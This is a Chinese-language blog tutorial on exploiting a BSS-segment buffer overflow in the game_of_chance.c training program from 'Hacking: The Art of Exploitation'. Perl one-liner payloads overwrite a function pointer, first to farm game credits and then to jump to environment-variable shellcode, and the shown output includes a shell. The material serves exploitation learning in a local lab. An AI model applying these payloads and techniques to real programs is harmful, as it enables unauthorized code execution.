作者：M0rk  
作者博客：
#### TL;DR
缓冲区溢出除了典型的[栈溢出](https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/
"栈溢出")和[堆溢出](https://kevien.github.io/2017/10/28/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/
"堆溢出")外，还有一种发生在bss段上的，bss属于数据段的一种，通常用来保存未初始化的全局静态变量。[wiki](https://www.wikiwand.com/en/BSS
"wiki")
测试环境ubuntu14.04X86.
###### vul code snippet
from game_of_chance.c
    // Custom user struct to store information about users 
    struct user {
        int uid;
        int credits;
        int highscore;
        char name[100];
        int (*current_game) ();
    };
    ...
    struct user player;     // Player struct
其中game_of_chance 是如下图的一个小游戏
如上的代码片段中用一个函数指针保存了上次玩了哪个游戏，这个指针保存在user的结构体中，且被声明为全局变量，这意味着user这个结构体变量保存在bss数据段。其中结构体中固定为100字节的name变量保存了用户的姓名，且这个name是可以被input_name()这个函数所控制的，如下：
    void input_name() {
       char *name_ptr, input_char='\n';
       while(input_char == '\n')    // Flush any leftover 
          scanf("%c", &input_char); // newline chars.
       name_ptr = (char *) &(player.name); // name_ptr = player name's address
       while(input_char != '\n') {  // Loop until newline.
          *name_ptr = input_char;   // Put the input char into name field.
          scanf("%c", &input_char); // Get the next char.
          name_ptr++;               // Increment the name pointer.
       }
       *name_ptr = 0;  // Terminate the string.
    }
这个函数会接收用户输入的名字直到用户输入换行符，所以这里并没有有效的限制用户输入，就意味着可以被利用，此外我们覆盖之后还需要程序去调用这个函数指针，这个功能可以发生在下面代码的6、8或者10行以及play_the_game()函数中，代码片段如下：
    if((choice  7))
           printf("\n[!!] The number %d is an invalid selection.\n\n", choice);
        else if (choice   
    [DEBUG] current_game pointer @ 0x08048f15
    ####### Pick a Number ######
    This game costs 10 credits to play. Simply pick a number
    between 1 and 20, and if you pick the winning number, you
    will win the jackpot of 100 credits!
    10 credits have been deducted from your account.
    Pick a number between 1 and 20: The winning number is 11
    Sorry, you didn't win.
    You now have 80 credits
    Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: M0rk]
    [You have 80 credits] ->  
    Change user name
    Enter your new name: Your name has been changed.
    -=[ Game of Chance Menu ]=-    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]
    [You have 80 credits] ->  
    [DEBUG] current_game pointer @ 0x08048ca5
    *+*+*+*+*+* JACKPOT *+*+*+*+*+*
    You have won the jackpot of 100 credits!
    You now have 180 credits
    Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]
    [You have 180 credits] ->  
    Thanks for playing! Bye.
    xxx@ubuntu:~/Desktop/pwntest/bssexploit$
可以看到函数被调用我们增加了100金币
因为只要有调用函数指针的操作就会触发jackpot函数，只要我们不退出，就可以无限刷金币,像是如下：
    perl -e 'print "1\n5\nn\n5\n" . "A"x100 . "\xa5\x8c\x04\x08\n" . "1\n" ."y\n"x10.  "n\n5\nM0rk\n7\n"' | ./game_of_chance
到这里可能有人会问那能不能getshell呢，答案是可以的，我们知道每个运行的程序都会加载系统变量，我们可以事先将shellcode写入到环境变量中，然后将跳转地址指向shellcode，就可以执行我们的shellcode了。getenvaddr用来获取SHELLCODE环境变量在程序运行时候所在的地址。
    xxx@ubuntu:~/Desktop/pwntest/bssexploit$ echo $SHELLCODE
    111ə̀j
                                                              XQh//shh/binQS̀
    xxx@ubuntu:~/Desktop/pwntest/bssexploit$ ./getenvaddr SHELLCODE ./game_of_chance
    SHELLCODE will be at 0xbffff206
    xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e 'print "1\n7\nn\n5\n" . "A"x100 . "\x06\xf2\xff\xbf\n" . "1\n"' > exploit_buff
    xxx@ubuntu:~/Desktop/pwntest/bssexploit$ cat exploit_buff - | ./game_of_chance 
    -=[ Game of Chance Menu ]=-    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: M0rk]
    [You have 1260 credits] ->  
    [DEBUG] current_game pointer @ 0x08048f15
    ####### Pick a Number ######
    This game costs 10 credits to play. Simply pick a number
    between 1 and 20, and if you pick the winning number, you
    will win the jackpot of 100 credits!
    10 credits have been deducted from your account.
    Pick a number between 1 and 20: The winning number is 6
    Sorry, you didn't win.
    You now have 1250 credits
    Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: M0rk]
    [You have 1250 credits] ->  
    Change user name
    Enter your new name: Your name has been changed.
    -=[ Game of Chance Menu ]=-    1 - Play the Pick a Number game
    2 - Play the No Match Dealer game
    3 - Play the Find the Ace game
    4 - View current high score
    5 - Change your user name
    6 - Reset your account at 100 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]
    [You have 1250 credits] ->  
    [DEBUG] current_game pointer @ 0xbffff206
    id
    uid=1000(xxx) gid=1000(xxx) groups=1000(xxx),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
#### 相关源码下载
[github repo](https://github.com/kevien/exploitcode "github repo")
#### reference
《Hacking the art of exploitation》0x342
* * *